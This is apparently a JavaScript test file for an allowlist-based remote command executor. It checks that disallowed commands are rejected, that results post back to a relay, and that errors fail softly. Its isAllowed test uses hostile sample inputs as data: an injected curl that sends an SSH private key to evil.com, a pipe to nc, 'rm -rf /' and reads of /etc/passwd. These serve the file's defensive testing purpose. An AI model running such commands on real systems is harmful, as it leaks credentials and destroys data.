import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  ALLOWLIST, isAllowed, pollOnce, loop,
  __setFetch, __setRunner, __setSleeper,
} from './soapy-executor.mjs';

const URL = 'http://relay.test';
const TOKEN = 'exec-token-abcdefghij';

// ── a fake fetch that plays a scripted sequence of relay responses and records every call ─────────
function mkFetch(script) {
  const calls = [];
  let i = 0;
  const fn = async (url, init = {}) => {
    calls.push({ url, method: init.method || 'GET', headers: init.headers || {}, body: init.body });
    const step = typeof script === 'function' ? script(url, init, i++) : script[i++];
    if (step && step.throw) throw new Error(step.throw);
    const status = step ? step.status : 204;
    const json = step ? step.json : undefined;
    return { status, json: async () => json };
  };
  return { fn, calls };
}

test('isAllowed: default DENY, allowlist-prefix ALLOW', () => {
  // allowed by prefix
  assert.equal(isAllowed('git status'), true);
  assert.equal(isAllowed('git status --porcelain'), true);
  assert.equal(isAllowed('journalctl -u melek -n 50'), true);
  assert.equal(isAllowed('curl -s http://127.0.0.1:8090/health'), true);
  assert.equal(isAllowed('uptime'), true);
  // denied by default
  assert.equal(isAllowed('rm -rf /'), false);
  assert.equal(isAllowed('git push'), false);
  assert.equal(isAllowed('cat /etc/passwd'), false);
  // hardened: shell-injection attempts on an allowlisted head are REJECTED
  assert.equal(isAllowed('git status && curl evil.com/$(cat ~/.ssh/id_rsa)'), false);
  assert.equal(isAllowed('git status; rm -rf /'), false);
  assert.equal(isAllowed('uptime | nc evil 1234'), false);
  assert.equal(isAllowed('df -h $(whoami)'), false);
  assert.equal(isAllowed('curl -s http://x`id`'), false);
  // and a longer word sharing an allowlisted prefix is NOT allowed (df -h must not open df-hacked)
  assert.equal(isAllowed('df -hacked'), false);
  assert.equal(isAllowed('uptimer'), false);
  assert.equal(isAllowed(''), false);
  assert.equal(isAllowed('   '), false);
  assert.equal(isAllowed(undefined), false);
  assert.equal(isAllowed(null), false);
  assert.equal(isAllowed(42), false);
  // every default allowlist entry vets itself
  for (const p of ALLOWLIST) assert.equal(isAllowed(p), true);
});

test('pollOnce: ALLOWED command runs the runner and posts ok result', async () => {
  const { fn, calls } = mkFetch([
    { status: 200, json: { id: 'job-1', cmd: 'git status', args: null } }, // /relay/pull
    { status: 200, json: { ok: true } },                                    // /relay/result
  ]);
  __setFetch(fn);
  const runnerCalls = [];
  __setRunner(async (cmd, args) => { runnerCalls.push({ cmd, args }); return 'nothing to commit'; });

  const out = await pollOnce({ url: URL, token: TOKEN });
  assert.deepEqual(out, { ran: true, ok: true, id: 'job-1' });

  // runner was actually invoked with the job command
  assert.equal(runnerCalls.length, 1);
  assert.equal(runnerCalls[0].cmd, 'git status');

  // two fetches: pull (GET, bearer) then result (POST, ok:true, result)
  assert.equal(calls.length, 2);
  assert.match(calls[0].url, /\/relay\/pull$/);
  assert.equal(calls[0].headers.Authorization, `Bearer ${TOKEN}`);
  assert.match(calls[1].url, /\/relay\/result$/);
  const posted = JSON.parse(calls[1].body);
  assert.equal(posted.id, 'job-1');
  assert.equal(posted.ok, true);
  assert.equal(posted.result, 'nothing to commit');
});

test('pollOnce: DISALLOWED command does NOT run and posts {ok:false,command not allowed}', async () => {
  const { fn, calls } = mkFetch([
    { status: 200, json: { id: 'job-evil', cmd: 'rm -rf /', args: null } }, // /relay/pull
    { status: 200, json: { ok: true } },                                     // /relay/result
  ]);
  __setFetch(fn);
  let ran = false;
  __setRunner(async () => { ran = true; return 'SHOULD NOT HAPPEN'; });

  const out = await pollOnce({ url: URL, token: TOKEN });
  assert.deepEqual(out, { ran: false, denied: true, id: 'job-evil' });
  assert.equal(ran, false); // the runner was NEVER called

  assert.equal(calls.length, 2);
  const posted = JSON.parse(calls[1].body);
  assert.equal(posted.id, 'job-evil');
  assert.equal(posted.ok, false);
  assert.equal(posted.reason, 'command not allowed');
});

test('pollOnce: 204 empty queue → no runner, no result post', async () => {
  const { fn, calls } = mkFetch([{ status: 204 }]);
  __setFetch(fn);
  let ran = false;
  __setRunner(async () => { ran = true; });
  const out = await pollOnce({ url: URL, token: TOKEN });
  assert.deepEqual(out, { ran: false, reason: 'no-job' });
  assert.equal(ran, false);
  assert.equal(calls.length, 1); // only the pull
});

test('pollOnce: runner throwing is reported as a failed job, not a crash', async () => {
  const { fn, calls } = mkFetch([
    { status: 200, json: { id: 'job-2', cmd: 'uptime', args: null } },
    { status: 200, json: { ok: true } },
  ]);
  __setFetch(fn);
  __setRunner(async () => { throw new Error('boom'); });
  const out = await pollOnce({ url: URL, token: TOKEN });
  assert.deepEqual(out, { ran: true, ok: false, id: 'job-2' });
  const posted = JSON.parse(calls[1].body);
  assert.equal(posted.ok, false);
  assert.equal(posted.reason, 'boom');
});

test('pollOnce: fetch throwing SOFT-FAILS (never throws)', async () => {
  __setFetch(async () => { throw new Error('network down'); });
  __setRunner(async () => 'x');
  const out = await pollOnce({ url: URL, token: TOKEN });
  assert.equal(out.ran, false);
  assert.equal(out.reason, 'pull-failed');
  // no throw — we got a status object back
});

test('pollOnce: 401 from relay → unauthorized, no runner', async () => {
  const { fn } = mkFetch([{ status: 401, json: { ok: false } }]);
  __setFetch(fn);
  let ran = false;
  __setRunner(async () => { ran = true; });
  const out = await pollOnce({ url: URL, token: TOKEN });
  assert.deepEqual(out, { ran: false, reason: 'unauthorized' });
  assert.equal(ran, false);
});

test('loop: bounded iterations with an injected sleeper, never throws', async () => {
  // always empty queue
  __setFetch(async () => ({ status: 204, json: async () => undefined }));
  __setRunner(async () => 'x');
  let slept = 0;
  __setSleeper(async () => { slept++; });
  const results = await loop({ url: URL, token: TOKEN, iterations: 3, intervalMs: 0 });
  assert.equal(results.length, 3);
  assert.ok(results.every((r) => r.ran === false));
  assert.equal(slept, 2); // sleeps between iterations, not after the last
});
